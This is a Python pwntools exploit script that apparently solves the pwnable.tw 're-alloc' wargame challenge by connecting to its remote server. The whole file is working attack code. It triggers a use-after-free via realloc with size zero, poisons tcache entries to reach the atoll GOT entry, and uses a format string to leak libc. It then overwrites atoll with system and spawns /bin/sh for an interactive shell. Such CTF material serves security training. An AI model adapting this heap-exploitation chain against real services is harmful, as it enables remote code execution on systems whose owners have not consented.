from pwn import *

# io = process("./re-alloc")
io = remote("chall.pwnable.tw", 10106)
e = ELF("./re-alloc")
# l = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
l = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")

def choose(option):
	io.sendlineafter("Your choice: ", str(option))
def indexOf(idx):
	io.sendlineafter("Index:", str(idx))
def sizeOf(size):
	io.sendlineafter("Size:", str(size))
def dataOf(data):
	io.sendafter("Data:", str(data))

def realloc(idx, size, data):
	choose(2)
	indexOf(idx)
	sizeOf(size)
	if size > 0:
		dataOf(data)
def alloc(idx, size, data):
	choose(1)
	indexOf(idx)
	sizeOf(size)
	if size > 0:
		dataOf(data)
def free(idx):
	choose(3)
	indexOf(idx)

# overwite atoll to printf
alloc(0, 0x78, 'XXXX')
realloc(0, 0, "") # UAF
realloc(0, 0x58, p64(e.got['atoll'])) # aware split > MINSIZE

# tcache(0x80) 0 -> atoll
alloc(1, 0x78, 'XXXX')
free(1)
realloc(0, 0x58, 'X'*0x10) # overwrite tcache_entry.key to bypass double free
free(0)

alloc(1, 0x68, 'XXXX')
realloc(1, 0, "") # UAF
realloc(1, 0x48, p64(e.got['atoll'])) # aware split > MINSIZE

# tcache(0x70) 1 -> atoll
alloc(0, 0x68, 'XXXX')
free(0)
realloc(1, 0x48, 'X'*0x10) # aware split > MINSIZE
free(1)

# tcache(0x80) -> atoll
# tcache(0x70) -> atoll
alloc(1, 0x78, p64(0x0000000000401070))

# leak libc
choose(3)
indexOf('%9$s....' + p64(e.got['puts']))
puts_at = unpack_many(io.recvuntil('....')[:-4], 'all')[0]
system_at = puts_at - l.symbols['puts'] + l.symbols['system']
print("puts at: {}".format(hex(puts_at)))
print("system at: {}".format(hex(system_at)))

# overwrite atoll to system
# alloc(0, 0x68, p64(system))
choose(1)
indexOf("\x00") # index 0
sizeOf("%{}c".format(0x68 - 1)) # newline
dataOf(p64(system_at))

choose(3)
indexOf("/bin/sh")
io.interactive()
